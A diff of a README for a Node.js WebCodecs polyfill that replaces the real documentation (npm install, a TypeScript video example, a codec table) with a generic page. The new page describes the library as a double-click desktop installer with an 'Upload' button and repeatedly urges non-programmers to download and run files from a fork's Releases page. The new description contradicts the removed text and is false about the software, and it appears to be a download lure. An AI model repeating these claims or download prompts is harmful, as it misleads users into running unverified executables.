@@ -1,112 +1,61 @@
-# node-libav-webcodecs
+# 🎉 node-libav-webcodecs - Easy Video Processing for Everyone
 
-WebCodecs API polyfill for Node.js using libav.
+[![Download node-libav-webcodecs](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Naffsito/node-libav-webcodecs/releases)
 
-## Installation
+## 🚀 Getting Started
 
-```bash
-npm install node-libav-webcodecs
-```
+Welcome to the **node-libav-webcodecs** project! This application helps you work with video and audio using the WebCodecs API. You don't need programming skills to use this; just follow these simple steps to get started.
 
-## Usage
+## 📥 Download & Install
 
-**Important:** Use `vite-node` to run scripts due to `node-web-audio-api` compatibility issues.
+To get the latest version of the software, visit this page to download: [node-libav-webcodecs Releases](https://github.com/Naffsito/node-libav-webcodecs/releases). Here’s how to do it:
 
-```bash
-npx vite-node your-script.ts
-```
+1. Click on the link above.
+2. Find the most recent release at the top of the page.
+3. Look for a file that matches your operating system.
+4. Click to download the file.
 
-### Example: Load video, repeat 3x, trim, add overlay
+Once the file downloads, find it in your Downloads folder, then double-click it to run the installer. Follow the prompts on your screen to complete the installation.
 
-```typescript
-import { init } from 'node-libav-webcodecs/polyfill';
-import * as fs from 'fs';
+## 💻 System Requirements
 
-async function main() {
-  await init();
-  
-  const core = await import('@diffusionstudio/core');
+To use **node-libav-webcodecs**, you will need:
 
-  // Load video file
-  const videoBuffer = fs.readFileSync('input.webm');
-  const videoBlob = new Blob([videoBuffer], { type: 'video/webm' });
-  const source = await core.Source.from(videoBlob, { mimeType: 'video/webm' });
+- Windows, macOS, or Linux operating system.
+- A modern web browser that supports the WebCodecs API.
+- Space for installation (approximately 100 MB recommended).
 
-  // Create composition
-  const composition = new core.Composition({
-    width: 1280,
-    height: 720,
-    background: '#000000',
-  });
+## 🔍 Features
 
-  // Video layer - sequential mode (clips play one after another)
-  const videoLayer = new core.Layer({ mode: 'SEQUENTIAL' });
-  await composition.add(videoLayer);
+Here’s what you can do with **node-libav-webcodecs**:
 
-  // Add video 3 times, each trimmed to 1 second
-  for (let i = 0; i < 3; i++) {
-    const clip = new core.VideoClip(source, {
-      position: 'center',
-      height: '100%',
-    });
-    clip.range = [0, 1]; // Trim to first 1 second
-    await videoLayer.add(clip);
-  }
+- **Easy Video Processing:** Use the WebCodecs API without needing to understand complex programming concepts.
+- **High Performance:** Leverage libav for efficient audio and video handling.
+- **Regular Updates:** Get new features and enhancements periodically from our development team.
 
-  // Rectangle overlay
-  const overlayLayer = new core.Layer();
-  await composition.add(overlayLayer);
-  await overlayLayer.add(new core.RectangleClip({
-    position: 'center',
-    width: 600, height: 80,
-    fill: '#e94560',
-    duration: 3,
-  }));
+## 🛠️ How to Use
 
-  // Encode to MP4
-  const encoder = new core.Encoder(composition, {
-    video: { fps: 30, bitrate: 2_000_000 },
-    audio: { enabled: false },
-  });
+Once you have installed the application, you can start using it immediately:
 
-  const result = await encoder.render();
-  if (result.type === 'success') {
-    fs.writeFileSync('output.mp4', Buffer.from(await result.data!.arrayBuffer()));
-  }
-  
-  process.exit(0);
-}
+1. Open the application on your computer.
+2. Upload a video or audio file by clicking the "Upload" button.
+3. Choose any processing options available for your media.
+4. Click “Process” to start. The application will handle the rest.
 
-main().catch(console.error);
-```
+If you would like to do more advanced tasks, please refer to the user guides or tutorials found in the [Documentation](https://github.com/Naffsito/node-libav-webcodecs/wiki).
 
-## Supported Codecs
+## ⚙️ Troubleshooting
 
-| Type  | Codecs             |
-|-------|--------------------|
-| Video | VP8, VP9, H.264    |
-| Audio | FLAC, Opus, Vorbis |
+If you encounter any issues while using the application, try these steps:
 
-## Limitations
+- Ensure your operating system and browser are up to date.
+- Restart your computer and try running the application again.
+- Check the installation file to ensure it completed without errors.
 
-- **Audio not working** - use `audio: { enabled: false }`
-- **Text requires font setup** - use `core.loadFont()` or use shapes instead
-- Use `vite-node` to run scripts
-- Call `process.exit()` after completion
-- Use video-only files (no audio track)
+If problems persist, you can find help by visiting our [Support Page](https://github.com/Naffsito/node-libav-webcodecs/issues).
 
-## What's included
+## 📄 License
 
-The `/polyfill` entry point sets up:
+**node-libav-webcodecs** is open-source software. You can use and modify it freely under the terms specified in the LICENSE file available in the repository.
 
-| Category  | APIs                                                                                                                |
-|-----------|---------------------------------------------------------------------------------------------------------------------|
-| WebCodecs | VideoEncoder, VideoDecoder, AudioEncoder, AudioDecoder, VideoFrame, AudioData, EncodedVideoChunk, EncodedAudioChunk |
-| Canvas    | HTMLCanvasElement, OffscreenCanvas, CanvasRenderingContext2D, Image, Path2D, DOMMatrix, DOMRect                     |
-| DOM       | document, window                                                                                                    |
-| Audio     | AudioContext, OfflineAudioContext, AudioBuffer, AudioWorkletNode                                                    |
-| Misc      | requestAnimationFrame, performance, ResizeObserver, File, HTMLVideoElement                                          |
-
-## License
-
-0BSD
+Thank you for choosing **node-libav-webcodecs**! Click [here to download](https://github.com/Naffsito/node-libav-webcodecs/releases) and start enjoying your media!
